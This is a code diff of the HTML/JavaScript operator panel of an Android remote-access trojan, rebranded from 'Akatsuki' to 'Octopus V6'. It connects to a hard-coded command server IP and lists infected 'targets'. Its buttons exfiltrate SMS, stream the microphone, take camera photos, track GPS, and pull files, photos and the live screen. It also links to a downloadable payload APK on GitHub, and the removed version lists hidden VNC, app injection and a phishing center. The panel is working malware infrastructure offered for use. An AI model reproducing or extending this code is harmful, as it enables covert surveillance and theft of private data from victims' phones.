@@ -2,142 +2,365 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>AKATSUKI V6 | COMMAND CENTER</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OCTOPUS V6 | INTELLIGENCE INTERFACE</title>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --red: #ff1a1a; --bg: #050505; --panel: #111; --border: #222; --text: #eee; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background: var(--bg); color: var(--text); display: flex; height: 100vh; overflow: hidden; }
+        :root {
+            --octopus-red: #ff1a1a;
+            --octopus-glow: rgba(255, 26, 26, 0.4);
+            --bg-dark: #050505;
+            --panel-bg: #0f0f0f;
+            --border-color: #222;
+            --text-main: #e0e0e0;
+            --text-dim: #777;
+        }
 
-        /* SIDEBAR */
-        aside { width: 280px; background: #000; border-right: 1px solid var(--border); display: flex; flex-direction: column; }
-        .logo { padding: 30px; text-align: center; color: var(--red); font-weight: bold; letter-spacing: 5px; border-bottom: 1px solid var(--border); }
-        .nav { flex: 1; padding: 10px 0; overflow-y: auto; }
-        .nav-item { padding: 12px 25px; color: #777; cursor: pointer; font-size: 13px; display: flex; align-items: center; transition: 0.3s; }
-        .nav-item:hover { color: #fff; background: rgba(255, 26, 26, 0.1); border-left: 3px solid var(--red); }
+        * { box-sizing: border-box; outline: none; }
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+        }
 
-        /* MAIN DASHBOARD */
-        main { flex: 1; display: flex; flex-direction: column; }
-        header { padding: 20px 40px; background: #000; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
-        .grid { flex: 1; padding: 30px; display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; overflow-y: auto; }
+        /* --- Sidebar Navigation --- */
+        aside {
+            width: 280px;
+            background: #000;
+            border-right: 1px solid var(--border-color);
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+        }
 
-        /* DEVICE CARD */
-        .card { background: var(--panel); border: 1px solid var(--border); border-radius: 5px; padding: 20px; transition: 0.3s; }
-        .card:hover { border-color: var(--red); box-shadow: 0 0 15px rgba(255, 26, 26, 0.1); }
-        .card-title { color: var(--red); font-size: 18px; margin-bottom: 10px; display: flex; justify-content: space-between; }
-        .attack-box { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-top: 15px; }
-        .btn-atk { background: #000; border: 1px solid #333; color: #888; padding: 8px; font-size: 10px; cursor: pointer; border-radius: 3px; text-transform: uppercase; }
-        .btn-atk:hover { background: var(--red); color: #fff; border-color: var(--red); }
+        .brand {
+            text-align: center;
+            margin-bottom: 40px;
+        }
 
-        /* REAL-TIME TERMINAL MODAL */
-        #terminal { position: fixed; bottom: 20px; right: 20px; width: 450px; height: 500px; background: #000; border: 1px solid var(--red); border-radius: 8px; display: none; flex-direction: column; z-index: 1000; box-shadow: 0 0 30px rgba(0,0,0,0.8); }
-        .term-head { padding: 10px; background: var(--red); color: #000; font-weight: bold; font-size: 12px; display: flex; justify-content: space-between; }
-        .term-body { flex: 1; padding: 15px; font-family: 'Consolas', monospace; font-size: 12px; overflow-y: auto; color: #00ff00; line-height: 1.5; }
-        .close-term { cursor: pointer; font-weight: bold; }
+        .brand i {
+            font-size: 40px;
+            color: var(--octopus-red);
+            filter: drop-shadow(0 0 8px var(--octopus-red));
+        }
+
+        .brand h2 {
+            font-size: 18px;
+            letter-spacing: 4px;
+            margin-top: 10px;
+            color: var(--text-main);
+        }
+
+        .nav-item {
+            padding: 12px 15px;
+            margin-bottom: 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: 0.3s;
+            display: flex;
+            align-items: center;
+            color: var(--text-dim);
+            border: 1px solid transparent;
+        }
+
+        .nav-item i { margin-right: 15px; width: 20px; text-align: center; }
+        .nav-item:hover {
+            color: var(--octopus-red);
+            background: rgba(255, 26, 26, 0.05);
+            border-color: rgba(255, 26, 26, 0.2);
+        }
+
+        .nav-item.active {
+            color: #fff;
+            background: var(--octopus-red);
+            box-shadow: 0 0 15px var(--octopus-glow);
+        }
+
+        /* --- Main Content --- */
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            background: radial-gradient(circle at center, #111 0%, #050505 100%);
+        }
+
+        header {
+            height: 60px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 30px;
+            background: #000;
+        }
+
+        .status-pill {
+            background: #111;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: #00ff00;
+            border: 1px solid #004400;
+        }
+
+        /* --- Target Grid --- */
+        .grid-container {
+            flex: 1;
+            padding: 30px;
+            overflow-y: auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 25px;
+            align-content: start;
+        }
+
+        .target-card {
+            background: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 20px;
+            transition: 0.4s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .target-card:hover {
+            border-color: var(--octopus-red);
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .target-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 4px; height: 100%;
+            background: var(--octopus-red);
+        }
+
+        .card-info h3 { margin: 0; font-size: 16px; color: #fff; }
+        .card-info p { margin: 5px 0 15px; font-size: 12px; color: var(--text-dim); }
+
+        .btn-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .action-btn {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            color: #ccc;
+            padding: 8px;
+            font-size: 11px;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: 0.2s;
+            text-transform: uppercase;
+        }
+
+        .action-btn:hover {
+            background: var(--octopus-red);
+            color: #fff;
+            border-color: var(--octopus-red);
+        }
+
+        /* --- Intelligence Terminal (Right) --- */
+        #intel-panel {
+            width: 450px;
+            background: #000;
+            border-left: 1px solid var(--border-color);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .terminal-header {
+            padding: 15px;
+            background: #111;
+            border-bottom: 1px solid var(--octopus-red);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .terminal-header h4 { margin: 0; color: var(--octopus-red); font-size: 13px; text-transform: uppercase; }
+
+        #logs {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            font-family: 'Consolas', monospace;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+
+        .log-item {
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #1a1a1a;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateX(10px); } to { opacity: 1; transform: translateX(0); } }
+
+        .log-type { color: var(--octopus-red); font-weight: bold; margin-right: 10px; }
+        .log-time { color: #555; font-size: 11px; }
+        .log-content { display: block; margin-top: 5px; color: #aaa; word-wrap: break-word; }
+
+        .log-img {
+            max-width: 100%;
+            border-radius: 4px;
+            border: 1px solid var(--octopus-red);
+            margin-top: 10px;
+        }
+
+        /* --- Custom Scrollbar --- */
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: #000; }
+        ::-webkit-scrollbar-thumb { background: #222; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--octopus-red); }
     </style>
 </head>
 <body>
 
-<aside>
-    <div class="logo">AKATSUKI</div>
-    <div class="nav">
-        <div class="nav-item">🏠 Dashboard</div>
-        <div class="nav-item">📡 Realtime Map</div>
-        <div class="nav-item">🖥️ Hidden VNC</div>
-        <div class="nav-item">📂 File Manager</div>
-        <div class="nav-item">🏛️ Phishing Center</div>
-        <div class="nav-item">🎙️ Mic Listening</div>
-        <div class="nav-item">💬 SMS Intercept</div>
-        <div class="nav-item">📞 Call Logs</div>
-    </div>
-</aside>
-
-<main>
-    <header>
-        <div>STATUS: <span id="conn-status" style="color: #00ff00;">CONNECTED</span></div>
-        <div style="color: var(--red)">51.75.118.169:20300</div>
-    </header>
-    <div class="grid" id="device-grid">
+    <aside>
+        <div class="brand">
+            <i class="fa-solid fa-octopus-deploy"></i>
+            <h2>OCTOPUS V6</h2>
         </div>
-</main>
 
-<div id="terminal">
-    <div class="term-head">
-        <span id="term-title">LIVE_ATTACK_LOGS</span>
-        <span class="close-term" onclick="closeTerminal()">[X]</span>
-    </div>
-    <div class="term-body" id="term-content">
-        Waiting for device response...
-    </div>
-</div>
+        <div class="nav-item active"><i class="fa-solid fa-desktop"></i> Dashboard</div>
+        <div class="nav-item"><i class="fa-solid fa-message"></i> SMS Explorer</div>
+        <div class="nav-item"><i class="fa-solid fa-camera"></i> Live Camera</div>
+        <div class="nav-item"><i class="fa-solid fa-microphone"></i> Mic Stream</div>
+        <div class="nav-item"><i class="fa-solid fa-location-dot"></i> GPS Tracking</div>
+        <div class="nav-item"><i class="fa-solid fa-file-invoice"></i> File Manager</div>
+        <div class="nav-item"><i class="fa-solid fa-bug"></i> Social Watch</div>
 
-<script>
-    const socket = io("http://51.75.118.169:20300", { 
-        query: { type: 'mastermind', key: 'octopus_god_mode' } 
-    });
-
-    socket.on('load_targets', (targets) => {
-        Object.keys(targets).forEach(id => addDevice(id, targets[id]));
-    });
-
-    socket.on('update_grid', (res) => addDevice(res.id, res.data));
-
-    // RECEIVE DATA (SMS, MIC, ETC)
-    socket.on('render_live_data', (payload) => {
-        openTerminal(payload.type);
-        const content = document.getElementById('term-content');
-        const time = new Date().toLocaleTimeString();
-        content.innerHTML += `<div style="margin-bottom:8px;">[${time}] <span style="color:white">${payload.data}</span></div>`;
-        content.scrollTop = content.scrollHeight;
-    });
-
-    function addDevice(id, data) {
-        let grid = document.getElementById('device-grid');
-        let card = document.getElementById(id);
-        
-        const html = `
-            <div class="card-title">
-                <span>${data.model || 'Unknown Device'}</span>
-                <span style="font-size:10px; color:#555;">${id.substring(0,8)}</span>
+        <div style="margin-top: auto;">
+            <div class="nav-item" style="color: #ff4d4d;" onclick="window.open('https://github.com/octopus29129/apkk/raw/main/Golden.apk')">
+                <i class="fa-solid fa-download"></i> Build APK
             </div>
-            <p style="font-size:11px; color:#666;">IP: ${data.ip || '0.0.0.0'} | Battery: ${data.battery || '--'}%</p>
-            <div class="attack-box">
-                <button class="btn-atk" onclick="exec('${id}','sms_dump')">Get SMS</button>
-                <button class="btn-atk" onclick="exec('${id}','mic_live')">Mic Access</button>
-                <button class="btn-atk" onclick="exec('${id}','vnc_hidden')">Hidden VNC</button>
-                <button class="btn-atk" onclick="exec('${id}','cam_snap')">Camera</button>
-                <button class="btn-atk" onclick="exec('${id}','inject_app')">Inject</button>
-                <button class="btn-atk" onclick="exec('${id}','gps_track')">GPS</button>
-            </div>
-        `;
+        </div>
+    </aside>
 
-        if(card) {
-            card.innerHTML = html;
-        } else {
-            const div = document.createElement('div');
-            div.id = id;
-            div.className = 'card';
-            div.innerHTML = html;
-            grid.appendChild(div);
+    <main>
+        <header>
+            <div class="status-pill">MASTER SERVER: ACTIVE [51.75.118.169]</div>
+            <div id="target-count" style="font-size: 13px;">Targets Online: 0</div>
+        </header>
+
+        <div class="grid-container" id="target-grid">
+            </div>
+    </main>
+
+    <div id="intel-panel">
+        <div class="terminal-header">
+            <h4><i class="fa-solid fa-bolt"></i> Intel Stream</h4>
+            <button class="action-btn" onclick="clearLogs()" style="padding: 2px 10px;">Clear</button>
+        </div>
+        <div id="logs">
+            <div class="log-item">
+                <span class="log-type">[SYSTEM]</span>
+                <span class="log-content">Waiting for target handshake...</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // CHANGE THIS TO YOUR VPS IP
+        const socket = io("http://51.75.118.169:20300", { query: { type: 'mastermind' } });
+
+        const grid = document.getElementById('target-grid');
+        const logs = document.getElementById('logs');
+        const countSpan = document.getElementById('target-count');
+
+        socket.on('load_targets', (targets) => {
+            grid.innerHTML = '';
+            Object.keys(targets).forEach(id => addTargetCard(id, targets[id]));
+            updateCount();
+        });
+
+        socket.on('update_grid', (res) => {
+            addTargetCard(res.id, res.data);
+            updateCount();
+        });
+
+        socket.on('device_left', (id) => {
+            const el = document.getElementById(id);
+            if (el) el.remove();
+            updateCount();
+        });
+
+        socket.on('render_live_data', (payload) => {
+            pushLog(payload.type, payload.data, payload.model);
+        });
+
+        function addTargetCard(id, data) {
+            let card = document.getElementById(id);
+            const content = `
+                <div class="card-info">
+                    <h3>${data.model || 'Unknown Device'}</h3>
+                    <p>ID: ${id.substring(0, 8)} | OS: Android ${data.os || '12+'}</p>
+                </div>
+                <div class="btn-group">
+                    <button class="action-btn" onclick="exec('${id}','sms_dump')"><i class="fa-solid fa-envelope"></i> SMS</button>
+                    <button class="action-btn" onclick="exec('${id}','mic_live')"><i class="fa-solid fa-microphone"></i> MIC</button>
+                    <button class="action-btn" onclick="exec('${id}','cam_snap')"><i class="fa-solid fa-camera"></i> BACK</button>
+                    <button class="action-btn" onclick="exec('${id}','cam_front')"><i class="fa-solid fa-user"></i> FRONT</button>
+                    <button class="action-btn" onclick="exec('${id}','gps_track')"><i class="fa-solid fa-map"></i> GPS</button>
+                    <button class="action-btn" onclick="exec('${id}','gallery_access')"><i class="fa-solid fa-images"></i> PICS</button>
+                    <button class="action-btn" onclick="exec('${id}','files_access')"><i class="fa-solid fa-folder"></i> FILES</button>
+                    <button class="action-btn" onclick="exec('${id}','social_watch')" style="color:red">LIVE SCREEN</button>
+                </div>
+            `;
+
+            if (!card) {
+                card = document.createElement('div');
+                card.id = id;
+                card.className = 'target-card';
+                grid.appendChild(card);
+            }
+            card.innerHTML = content;
         }
-    }
 
-    function exec(targetId, action) {
-        socket.emit('run_action', { targetId, action });
-        openTerminal(action.toUpperCase());
-        document.getElementById('term-content').innerHTML = `[!] Command Sent: ${action}<br>[*] Awaiting Target Response...<br>`;
-    }
+        function pushLog(type, data, model) {
+            const item = document.createElement('div');
+            item.className = 'log-item';
+            
+            const time = new Date().toLocaleTimeString();
+            let body = '';
 
-    function openTerminal(title) {
-        document.getElementById('terminal').style.display = 'flex';
-        document.getElementById('term-title').innerText = "LIVE_DATA: " + title;
-    }
+            if (type === 'CAM_SNAPSHOT') {
+                body = `<img src="${data}" class="log-img">`;
+            } else if (typeof data === 'object') {
+                body = `<span class="log-content">${JSON.stringify(data, null, 2)}</span>`;
+            } else {
+                body = `<span class="log-content">${data}</span>`;
+            }
 
-    function closeTerminal() {
-        document.getElementById('terminal').style.display = 'none';
-        document.getElementById('term-content').innerHTML = "";
-    }
-</script>
+            item.innerHTML = `
+                <span class="log-time">${time} - ${model}</span><br>
+                <span class="log-type">[${type}]</span>
+                ${body}
+            `;
+            
+            logs.prepend(item);
+        }
 
+        function exec(targetId, action) {
+            socket.emit('run_action', { targetId, action });
+            pushLog('COMMAND', `Executing ${action}...`, targetId);
+        }
+
+        function clearLogs() { logs.innerHTML = ''; }
+        function updateCount() {
+            countSpan.innerText = `Targets Online: ${document.getElementsByClassName('target-card').length}`;
+        }
+    </script>
 </body>
 </html>
